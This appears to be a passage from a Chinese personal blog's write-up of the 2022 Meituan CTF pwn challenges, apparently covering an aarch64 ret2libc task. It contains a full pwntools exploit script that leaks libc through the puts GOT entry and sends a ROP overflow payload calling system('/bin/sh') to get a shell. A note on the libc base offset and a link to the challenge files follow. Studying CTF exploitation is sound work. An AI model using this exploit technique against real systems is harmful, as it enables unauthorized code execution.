<p>Leak完后会有个overflow函数用于ROP利用。这里我打算使用的gadget是libc里的这段，把/bin/sh的地址放入x0，system函数的地址放入x30，然后ret执行。</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic05.png" alt="pic05"></p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;aarch64&#39;, log_level=&#39;debug&#39;)

io = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)
libc = ELF(&quot;./libc.so.6&quot;)
puts_got =elf.got[&#39;puts&#39;]

io.sendlineafter(&quot;3.Exit.&quot;, &quot;1&quot;)
io.sendafter(&quot;sensible&gt;&gt;\n&quot;, p64(puts_got))
libc_base = u64(io.recv(3).ljust(8, b&#39;\x00&#39;)) + 0x4000000000 - libc.symbols[&#39;puts&#39;]
print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))

system = libc_base + libc.symbols[&#39;system&#39;]
binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
gadget = libc_base + 0x63e5c
io.sendlineafter(&quot;3.Exit.&quot;, &quot;2&quot;)
payload = b&#39;A&#39;*(128+8) + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)
io.sendlineafter(&quot;sensible&gt;&gt;&quot;, payload)
io.interactive()
</code></pre>
<p>在本地打的时候，一开始没打通，调试发现libc的基址竟然时0x55开头，将exp中的0x4000000000改成0x5500000000就好了。难道是环境没模拟好？🤔</p>
<br>

<h2 id="0x04：题目附件"><a href="#0x04：题目附件" class="headerlink" title="0x04：题目附件"></a>0x04：题目附件</h2><p>2022年第五届美团CTFpwn题附件：</p>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA">https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA</a><br>提取码：lele</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">tolele</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">http://example.com/2022/10/08/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">tolele的自由小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/fen/wen02.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/09/%E5%BC%82%E6%9E%84Pwn/"><img class="prev-cover" src="/img/fen/wen03.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">异构Pwn</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/02/%E8%AE%B0%E4%B8%80%E6%AC%A1GitHub-Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E8%BF%87%E7%A8%8B/"><img class="next-cover" src="/img/topimg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记一次GitHub+Hexo搭建个人博客的过程</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cropPhoto.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tolele</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/toleleYJL"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/toleleYJL" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1623093551@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/1623093551" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎交流~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9Anote"><span class="toc-number">1.</span> <span class="toc-text">0x00：note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9ASMTP"><span class="toc-number">2.</span> <span class="toc-text">0x01：SMTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E6%8D%89%E8%BF%B7%E8%97%8F"><span class="toc-number">3.</span> <span class="toc-text">0x02：捉迷藏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9Aret2libc-aarch64"><span class="toc-number">4.</span> <span class="toc-text">0x03：ret2libc_aarch64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">0x04：题目附件</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/10/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞"><img src="/img/fen/wen09.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串漏洞"/></a><div class="content"><a class="title" href="/2022/10/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">格式化字符串漏洞</a><time datetime="2022-10-30T13:30:33.000Z" title="发表于 2022-10-30 21:30:33">2022-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/16/%E5%85%B3%E4%BA%8Emalloc%E6%BA%90%E7%A0%81%E4%B8%ADbin-at%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/" title="关于malloc源码中bin_at宏定义的个人见解"><img src="/img/fen/wen08.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于malloc源码中bin_at宏定义的个人见解"/></a><div class="content"><a class="title" href="/2022/10/16/%E5%85%B3%E4%BA%8Emalloc%E6%BA%90%E7%A0%81%E4%B8%ADbin-at%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/" title="关于malloc源码中bin_at宏定义的个人见解">关于malloc源码中bin_at宏定义的个人见解</a><time datetime="2022-10-16T02:26:50.000Z" title="发表于 2022-10-16 10:26:50">2022-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/16/Angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="Angr学习记录"><img src="/img/fen/wen07.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Angr学习记录"/></a><div class="content"><a class="title" href="/2022/10/16/Angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="Angr学习记录">Angr学习记录</a><time datetime="2022-10-16T00:34:32.000Z" title="发表于 2022-10-16 08:34:32">2022-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/15/Base64%E9%9A%90%E5%86%99/" title="Base64隐写"><img src="/img/fen/wen06.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Base64隐写"/></a><div class="content"><a class="title" href="/2022/10/15/Base64%E9%9A%90%E5%86%99/" title="Base64隐写">Base64隐写</a><time datetime="2022-10-15T01:14:05.000Z" title="发表于 2022-10-15 09:14:05">2022-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/12/%E6%9B%B4%E6%8D%A2%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6glibc%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E4%B8%80%E6%AC%A1%E6%8C%A3%E6%89%8E/" title="更换可执行文件glibc版本的某一次挣扎"><img src="/img/fen/wen05.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="更换可执行文件glibc版本的某一次挣扎"/></a><div class="content"><a class="title" href="/2022/10/12/%E6%9B%B4%E6%8D%A2%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6glibc%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E4%B8%80%E6%AC%A1%E6%8C%A3%E6%89%8E/" title="更换可执行文件glibc版本的某一次挣扎">更换可执行文件glibc版本的某一次挣扎</a><time datetime="2022-10-12T00:36:20.000Z" title="发表于 2022-10-12 08:36:20">2022-10-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By tolele</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>